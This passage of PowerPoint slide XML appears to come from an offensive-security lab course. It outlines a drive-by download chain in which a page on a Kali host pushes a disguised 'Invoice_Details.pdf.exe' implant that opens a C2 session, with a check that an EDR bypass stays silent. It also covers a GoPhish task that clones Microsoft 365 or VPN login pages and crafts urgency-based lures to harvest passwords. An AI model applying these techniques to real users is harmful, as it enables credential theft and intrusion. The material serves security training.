            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="80000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>The script runs automatically, triggering a download of Invoice_Details.pdf.exe.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="80000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>If the victim opens that downloaded file, your implant.exe executes, and you receive a C2 session.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="30000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="19958911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7032171"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Testing the Complete Chain (In Your Lab)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>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2626497823"/>
              </p:ext>
            </p:extLst>
          </p:nvPr>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="0" y="601980"/>
          <a:ext cx="11908971" cy="2598420"/>
        </p:xfrm>
        <a:graphic>
          <a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/table">
            <a:tbl>
              <a:tblPr firstRow="1" bandRow="1">
                <a:tableStyleId>{5C22544A-7EE6-4342-B048-85BDC9FD1C3A}</a:tableStyleId>
              </a:tblPr>
              <a:tblGrid>
                <a:gridCol w="805540">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="988460024"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="7133774">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="3813199477"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="3969657">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="2208906645"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
              </a:tblGrid>
              <a:tr h="370840">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr algn="l"/>
                      <a:r>
                        <a:rPr lang="en-US" b="0" dirty="0">
                          <a:effectLst/>
                          <a:latin typeface="quote-cjk-patch"/>
                        </a:rPr>
                        <a:t>Step</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marR="152400" marT="95250" marB="95250" anchor="ctr"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr algn="l"/>
                      <a:r>
                        <a:rPr lang="en-US" b="0" dirty="0">
                          <a:effectLst/>
                          <a:latin typeface="quote-cjk-patch"/>
                        </a:rPr>
                        <a:t>Action</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="152400" marR="152400" marT="95250" marB="95250" anchor="ctr"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr algn="l"/>
                      <a:r>
                        <a:rPr lang="en-US" b="0">
                          <a:effectLst/>
                          <a:latin typeface="quote-cjk-patch"/>
                        </a:rPr>
                        <a:t>Expected Result</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="152400" marR="152400" marT="95250" marB="95250" anchor="ctr"/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="1403305964"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="370840">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" b="0">
                          <a:effectLst/>
                          <a:latin typeface="quote-cjk-patch"/>
                        </a:rPr>
                        <a:t>1</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marR="152400" marT="95250" marB="95250" anchor="ctr"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="fi-FI" b="0" dirty="0">
                          <a:effectLst/>
                          <a:latin typeface="quote-cjk-patch"/>
                        </a:rPr>
                        <a:t>Run sudo python3 -m http.server 80 on Kali</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="152400" marR="152400" marT="95250" marB="95250" anchor="ctr"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" b="0">
                          <a:effectLst/>
                          <a:latin typeface="quote-cjk-patch"/>
                        </a:rPr>
                        <a:t>Server waiting for requests</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="152400" marT="95250" marB="95250" anchor="ctr"/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="1839598486"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="370840">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" b="0" dirty="0">
                          <a:effectLst/>
                          <a:latin typeface="quote-cjk-patch"/>
                        </a:rPr>
                        <a:t>2</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marR="152400" marT="95250" marB="95250" anchor="ctr"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" b="0" dirty="0">
                          <a:effectLst/>
                          <a:latin typeface="quote-cjk-patch"/>
                        </a:rPr>
                        <a:t>On Windows VM, open Firefox/Chrome and go to http://&lt;KALI_IP&gt;/invoice.html</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="152400" marR="152400" marT="95250" marB="95250" anchor="ctr"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" b="0" dirty="0">
                          <a:effectLst/>
                          <a:latin typeface="quote-cjk-patch"/>
                        </a:rPr>
                        <a:t>Browser downloads Invoice_Details.pdf.exe</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="152400" marT="95250" marB="95250" anchor="ctr"/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="4044068387"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="370840">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" b="0">
                          <a:effectLst/>
                          <a:latin typeface="quote-cjk-patch"/>
                        </a:rPr>
                        <a:t>3</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marR="152400" marT="95250" marB="95250" anchor="ctr"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" b="0" dirty="0">
                          <a:effectLst/>
                          <a:latin typeface="quote-cjk-patch"/>
                        </a:rPr>
                        <a:t>Run the downloaded .exe</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="152400" marR="152400" marT="95250" marB="95250" anchor="ctr"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" b="0">
                          <a:effectLst/>
                          <a:latin typeface="quote-cjk-patch"/>
                        </a:rPr>
                        <a:t>C2 listener gets a session</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="152400" marT="95250" marB="95250" anchor="ctr"/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="1863762819"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="370840">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" b="0">
                          <a:effectLst/>
                          <a:latin typeface="quote-cjk-patch"/>
                        </a:rPr>
                        <a:t>4</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marR="152400" marT="95250" marB="95250" anchor="ctr"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" b="0">
                          <a:effectLst/>
                          <a:latin typeface="quote-cjk-patch"/>
                        </a:rPr>
                        <a:t>Check Defender / EDR logs</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="152400" marR="152400" marT="95250" marB="95250" anchor="ctr"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" b="0" dirty="0">
                          <a:effectLst/>
                          <a:latin typeface="quote-cjk-patch"/>
                        </a:rPr>
                        <a:t>If bypass works, no alert</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="152400" marT="95250" marB="95250" anchor="ctr"/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="2675421709"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
            </a:tbl>
          </a:graphicData>
        </a:graphic>
      </p:graphicFrame>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="34107843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367260" cy="6858000"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="ctr">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2600" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="ctr">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2600" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="ctr">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2600" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="ctr">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2600" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="ctr">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2600" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="ctr">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2600" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="ctr">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2600" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="ctr">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2600" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2600" dirty="0"/>
              <a:t>                                                         Task 3</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="2" name="Rectangle 1"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="0" y="-54124"/>
            <a:ext cx="0" cy="565449"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="15151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26979" tIns="142830" rIns="-26979" bIns="14283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366164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2400" y="365126"/>
            <a:ext cx="11201400" cy="745218"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Task 03: Phishing Infrastructure with </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" err="1"/>
              <a:t>GoPhish</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="152400" y="1110344"/>
            <a:ext cx="12039600" cy="5747655"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" lvl="0" indent="0" fontAlgn="base">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Description:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Set up a full-scale phishing platform to track who clicks your links and who submits their passwords. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" lvl="0" indent="0" fontAlgn="base">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Technical Requirements: </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>○ </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Installation:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Set up </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" err="1"/>
              <a:t>GoPhish</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> (Open-Source Phishing Framework) on your server. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>○ </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Landing Pages:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Use the "Import" feature to clone a legitimate login page (e.g., Microsoft 365 or a company VPN portal). </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>○ </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Email Templates:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Design a highly convincing email template using Social Engineering triggers (Urgency, Authority, or Fear). </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" lvl="0" indent="0" fontAlgn="base">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Learning Goal:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Mastering the technical side of "Email Delivery" and "Tracking" which is the #1 entry point for data breaches globally. </a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="7711901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7999"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:lnSpc>
                <a:spcPct val="70000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2300" b="1" dirty="0">
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>Part 1 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2300" dirty="0"/>
              <a:t>○ </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2300" b="1" dirty="0"/>
              <a:t>Installation:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2300" dirty="0"/>
              <a:t> Set up </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2300" b="1" dirty="0" err="1"/>
              <a:t>GoPhish</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2300" dirty="0"/>
              <a:t> (Open-Source Phishing Framework) on your server. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:lnSpc>
                <a:spcPct val="70000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="2300" b="1" dirty="0">
              <a:latin typeface="quote-cjk-patch"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="457200" lvl="0" indent="-457200" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:lnSpc>
                <a:spcPct val="92000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2300" dirty="0">
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>Install </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2300" dirty="0" err="1">
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>GoPhish</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2300" dirty="0">
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t> via APT (simplest)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" lvl="0" indent="0" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2300" dirty="0">
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>sudo apt update &amp;&amp; </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2300" dirty="0" err="1">
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>sudo</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2300" dirty="0">
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t> apt install </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2300" dirty="0" err="1">
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>gophish</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2300" dirty="0">
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t> -y</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" lvl="0" indent="0" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2300" dirty="0">
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>2. Start the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2300" dirty="0" err="1">
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>GoPhish</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2300" dirty="0">
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t> service</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" lvl="0" indent="0" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2300" dirty="0">
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>sudo </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2300" dirty="0" err="1">
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>systemctl</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2300" dirty="0">
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t> start </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2300" dirty="0" err="1">
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>gophish</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2300" dirty="0">
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t> &amp;&amp; </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2300" dirty="0" err="1">
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>sudo</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2300" dirty="0">
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2300" dirty="0" err="1">
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>systemctl</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2300" dirty="0">
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t> enable </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2300" dirty="0" err="1">
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>gophish</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2300" dirty="0">
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t> # optional: start on boot</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" lvl="0" indent="0" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:lnSpc>
                <a:spcPct val="92000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="2300" dirty="0">
              <a:latin typeface="quote-cjk-patch"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" lvl="0" indent="0" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:lnSpc>
                <a:spcPct val="92000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2300" dirty="0">
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>3. Find the auto-generated admin password</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" lvl="0" indent="0" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:lnSpc>
                <a:spcPct val="92000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2300" dirty="0">
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>sudo </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2300" dirty="0" err="1">
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>journalctl</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2300" dirty="0">
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t> -u </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2300" dirty="0" err="1">
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>gophish</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2300" dirty="0">
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t> --no-pager | grep "Please login"</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" lvl="0" indent="0" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:lnSpc>
                <a:spcPct val="92000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2300" dirty="0">
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>Output example:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" lvl="0" indent="0" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:lnSpc>
                <a:spcPct val="92000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2300" dirty="0">
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>level=info msg="Please login with the username admin and the password 69fcd967a5c1d9e7“</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" lvl="0" indent="0" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:lnSpc>
